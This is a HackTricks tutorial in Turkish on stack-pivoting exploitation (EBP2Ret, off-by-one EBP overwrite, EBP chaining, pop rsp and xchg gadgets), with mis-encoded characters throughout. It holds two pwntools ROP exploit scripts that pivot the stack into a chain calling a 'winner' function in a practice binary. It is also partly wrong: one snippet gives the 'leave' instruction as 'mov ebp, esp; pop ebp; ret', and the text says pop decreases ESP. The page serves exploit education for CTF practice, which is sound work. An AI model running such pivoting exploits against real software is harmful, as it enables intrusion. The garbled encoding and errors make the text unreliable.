# YÄ±ÄŸÄ±n Pivotalama - EBP2Ret - EBP zincirleme

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nleri**](https://peass.creator-spring.com)'ni edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Temel Bilgiler

Bu teknik, **Base Pointer (EBP)**'yi manipÃ¼le etme yeteneÄŸini kullanarak EBP kaydÄ±nÄ±n dikkatli bir ÅŸekilde kullanÄ±mÄ± ve **`leave; ret`** komut dizisinin zincirleme yÃ¼rÃ¼tÃ¼lmesini saÄŸlar.

HatÄ±rlatma olarak, **`leave`** temelde ÅŸunu ifade eder:
```
mov       ebp, esp
pop       ebp
ret
```
Ve **EBP, EIP'den Ã¶nce stack'te** olduÄŸundan, stack'i kontrol ederek EBP'yi kontrol etmek mÃ¼mkÃ¼ndÃ¼r.

### EBP2Ret

Bu teknik, **EBP kaydÄ±nÄ± deÄŸiÅŸtirebileceÄŸiniz ancak EIP kaydÄ±nÄ± doÄŸrudan deÄŸiÅŸtiremeyeceÄŸiniz durumlarda** Ã¶zellikle yararlÄ±dÄ±r. FonksiyonlarÄ±n Ã§alÄ±ÅŸmayÄ± bitirdiklerindeki davranÄ±ÅŸlarÄ±nÄ± kullanÄ±r.

`fvuln`'nin yÃ¼rÃ¼tÃ¼lmesi sÄ±rasÄ±nda, stack'e **sahte bir EBP** enjekte etmeyi baÅŸarÄ±rsanÄ±z ve bu sahte EBP, shellcode'unuzun adresinin bulunduÄŸu bellek alanÄ±na iÅŸaret eder (pop iÅŸlemi iÃ§in 4 bayt eklenerek), EIP'yi dolaylÄ± olarak kontrol edebilirsiniz. `fvuln` geri dÃ¶ndÃ¼ÄŸÃ¼nde, ESP bu hazÄ±rlanmÄ±ÅŸ konuma ayarlanÄ±r ve ardÄ±ÅŸÄ±k `pop` iÅŸlemi ESP'yi 4 azaltarak **saldÄ±rganÄ±n oraya sakladÄ±ÄŸÄ± bir adrese iÅŸaret etmesini saÄŸlar.**\
Dikkat edin ki **2 adresi bilmelisiniz**: ESP'nin gideceÄŸi adres ve ESP'nin iÅŸaret ettiÄŸi adrese yazmanÄ±z gereken adres.

#### SaldÄ±rÄ± OluÅŸturma

Ä°lk olarak, **keyfi veri / adresler yazabileceÄŸiniz bir adresi bilmelisiniz**. ESP buraya iÅŸaret edecek ve **ilk `ret`'yi Ã§alÄ±ÅŸtÄ±racak**.

ArdÄ±ndan, **keyfi kodu Ã§alÄ±ÅŸtÄ±racak** `ret` tarafÄ±ndan kullanÄ±lan adresi bilmelisiniz. ÅunlarÄ± kullanabilirsiniz:

* GeÃ§erli bir [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) adresi.
* **`system()`** adresi, **4 gereksiz bayt** ve `"/bin/sh"` adresi (x86 bit).
* Bir **`jump esp;`** cihazÄ±nÄ±n ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) adresi ve Ã§alÄ±ÅŸtÄ±rÄ±lacak **shellcode** adresi.
* BazÄ± [**ROP**](../rop-return-oriented-programing/) zinciri

Kontrol edilen belleÄŸin bu adreslerinden Ã¶nce **`4` bayt** olmalÄ±dÄ±r Ã§Ã¼nkÃ¼ `leave` talimatÄ±nÄ±n `pop` kÄ±smÄ±. Bu 4B'yi kullanarak **ikinci sahte EBP**'yi ayarlamak ve yÃ¼rÃ¼tÃ¼mÃ¼ kontrol etmeye devam etmek mÃ¼mkÃ¼n olabilir.

#### Bir Fazla Bir Hata SaldÄ±rÄ±sÄ±

Bu tekniÄŸin belirli bir varyantÄ± olan "Bir Fazla Bir Hata SaldÄ±rÄ±sÄ±" adlÄ± Ã¶zel bir varyantÄ± vardÄ±r. YalnÄ±zca EBP'nin en az anlamlÄ± baytÄ±nÄ± deÄŸiÅŸtirebileceÄŸiniz durumlarda kullanÄ±lÄ±r. Bu durumda, **`ret` ile atlanacak adresi depolayan bellek konumu, EBP ile ilk Ã¼Ã§ baytÄ± paylaÅŸmalÄ±dÄ±r**, daha kÄ±sÄ±tlayÄ±cÄ± koÅŸullarla benzer bir manipÃ¼lasyon iÃ§in izin verir.\
Genellikle mÃ¼mkÃ¼n olduÄŸunca uzaÄŸa atlamak iÃ§in bayt 0x00 deÄŸiÅŸtirilir.

AyrÄ±ca, stack'te bir RET kaydÄ±rÄ±cÄ±sÄ± kullanmak ve gerÃ§ek ROP zincirini sona koymak, yeni ESP'nin RET KAYDIRICISI'nÄ±n iÃ§ine iÅŸaret etme olasÄ±lÄ±ÄŸÄ±nÄ± artÄ±rÄ±r ve son ROP zincirinin yÃ¼rÃ¼tÃ¼lmesini saÄŸlar.

### **EBP Zincirleme**

Bu nedenle, stack'in `EBP` giriÅŸine kontrol edilen bir adres ve `EIP`'de `leave; ret` adresine bir adres koyarak, `ESP`'yi stack'teki kontrol edilen `EBP` adresine **taÅŸÄ±mak mÃ¼mkÃ¼ndÃ¼r**.

Åimdi, **`ESP`** istenen bir adrese iÅŸaret ederek kontrol edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lacak sonraki talimat bir `RET`'dir. Bunu kÃ¶tÃ¼ye kullanmak iÃ§in, kontrol edilen ESP yerine ÅŸunu yerleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r:

* **`&(sonraki sahte EBP)`** -> `leave` talimatÄ±ndaki `pop ebp` nedeniyle yeni EBP'yi yÃ¼kler
* **`system()`** -> `ret` tarafÄ±ndan Ã§aÄŸrÄ±lÄ±r
* **`&(leave;ret)`** -> sistem sona erdikten sonra Ã§aÄŸrÄ±lÄ±r, ESP'yi sahte EBP'ye taÅŸÄ±yacak ve yeniden baÅŸlayacak
* **`&("/bin/sh")`**-> `system` iÃ§in parametre

Temelde bu ÅŸekilde programÄ±n akÄ±ÅŸÄ±nÄ± kontrol etmek iÃ§in birkaÃ§ sahte EBP zincirlemek mÃ¼mkÃ¼ndÃ¼r.

Bu, bir [ret2lib](../rop-return-oriented-programing/ret2lib/) gibi, ancak gÃ¶rÃ¼nÃ¼r bir faydasÄ± olmayan ancak bazÄ± sÄ±nÄ±rlÄ± durumlarda ilginÃ§ olabilecek daha karmaÅŸÄ±k bir tekniktir.

AyrÄ±ca, burada bu tekniÄŸi bir **stack sÄ±zÄ±ntÄ±sÄ±** ile kazanan bir iÅŸlevi Ã§aÄŸÄ±rmak iÃ§in kullanan bir [**meydan okuma Ã¶rneÄŸi**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) bulunmaktadÄ±r. Bu, sayfadaki final yÃ¼kÃ¼dÃ¼r:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP kullanÄ±lmayabilir

[**Bu gÃ¶nderide aÃ§Ä±klandÄ±ÄŸÄ± gibi**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), bir ikili bazÄ± optimizasyonlarla derlenmiÅŸse, **EBP hiÃ§bir zaman ESP'yi kontrol etmeyecek**, bu nedenle, EBP'yi kontrol ederek Ã§alÄ±ÅŸan herhangi bir saldÄ±rÄ± temelde baÅŸarÄ±sÄ±z olacaktÄ±r Ã§Ã¼nkÃ¼ gerÃ§ek bir etkisi olmayacaktÄ±r.\
Bu, ikili dosya optimize edilmiÅŸse **prolog ve epilog deÄŸiÅŸikliklerinin** olmasÄ± nedeniyledir.

* **Optimize edilmemiÅŸ:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **Optimize EdilmiÅŸ:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## RSP'yi kontrol etmenin diÄŸer yollarÄ±

### **`pop rsp`** cihazÄ±

Bu teknik kullanÄ±larak bir Ã¶rnek bulabilirsiniz. Bu zorluk iÃ§in belirli 2 argÃ¼manla bir iÅŸlevi Ã§aÄŸÄ±rmak gerekiyordu ve bir **`pop rsp` cihazÄ±** bulunmaktaydÄ± ve bir **yÄ±ÄŸÄ±ndan sÄ±zÄ±ntÄ±** vardÄ±:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp cihazÄ±
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

ret2esp tekniÄŸini buradan kontrol edin:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## Referanslar ve DiÄŸer Ã–rnekler

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 bit, ret sled ile baÅŸlayan bir rop zinciri ile bir eksiklikten yararlanma
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 bit, relro, canary, nx ve pie olmayan. Program, yÄ±ÄŸÄ±n veya pie iÃ§in bir sÄ±zÄ±ntÄ± saÄŸlar ve bir qword'un WWW'sini verir. Ä°lk olarak yÄ±ÄŸÄ±n sÄ±zÄ±ntÄ±sÄ±nÄ± alÄ±n ve WWW'yi kullanarak geri gidin ve pie sÄ±zÄ±ntÄ±sÄ±nÄ± alÄ±n. Sonra WWW'yi kullanarak `.fini_array` giriÅŸlerini istismar ederek `__libc_csu_fini`'yi Ã§aÄŸÄ±rarak sonsuz bir dÃ¶ngÃ¼ oluÅŸturun ([daha fazla bilgi iÃ§in buraya bakÄ±n](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)). Bu "sonsuz" yazma istismar edilerek, bir ROP zinciri .bss iÃ§ine yazÄ±lÄ±r ve RBP ile dÃ¶nerek onu Ã§aÄŸÄ±rÄ±r.

## ARM64

ARM64'te, fonksiyonlarÄ±n **giriÅŸ ve Ã§Ä±kÄ±ÅŸlarÄ±** SP kaydÄ±nÄ± yÄ±ÄŸÄ±nda **saklamaz ve geri alamaz**. Bu nedenle, varsayÄ±lan olarak, yÄ±ÄŸÄ±n iÃ§indeki bazÄ± verileri Ã¼zerine yazarak SP kaydÄ±nÄ± kontrol edemezsiniz.



<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keÅŸfedin**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya** bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
